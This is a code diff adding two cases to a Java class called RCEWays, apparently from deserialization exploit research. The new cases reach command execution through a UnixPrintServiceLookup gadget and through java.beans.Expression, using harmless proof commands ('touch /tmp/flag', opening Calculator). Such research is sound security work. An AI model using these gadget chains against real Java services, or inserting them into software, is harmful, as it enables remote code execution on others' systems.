@@ -5,8 +5,11 @@ import org.apache.commons.collections.functors.InstantiateTransformer;
 import sun.print.UnixPrintService;
 import sun.print.UnixPrintServiceLookup;
 import xyz.eki.marshalexp.gadget.jdk.GUnixPrintService;
+import xyz.eki.marshalexp.utils.MiscUtils;
 import xyz.eki.marshalexp.utils.ReflectUtils;
 
+import java.beans.Expression;
+import java.io.ByteArrayInputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
 import java.lang.reflect.Type;
@@ -82,7 +85,27 @@ public class RCEWays {
         execCommand.invoke(null,cmd);
     }
 
+    //Unix (Not Mac) Only
+    public static void case7() throws Exception{
+        cmd = "touch /tmp/flag";
+        UnixPrintServiceLookup exp = GUnixPrintService.getDefaultPrintService2RCE(cmd);
+        Method getPrinterIsAcceptingJobsAIXMethod = UnixPrintServiceLookup.class.getDeclaredMethod("getDefaultPrintService");
+        getPrinterIsAcceptingJobsAIXMethod.invoke(exp,null);
+
+        //System.out.println("wtf");
+
+        System.out.println(MiscUtils.executeCommand("ls /tmp"));
+
+
+    }
+
+    public static void case8() throws Exception{
+        Runtime runtime = Runtime.getRuntime();
+        Expression expression = new Expression(runtime, "exec", new Object[]{"open -a Calculator"});
+        expression.getValue();
+    }
+
     public static void main(String[] args) throws Exception{
-        case6();
+        case8();
     }
 }
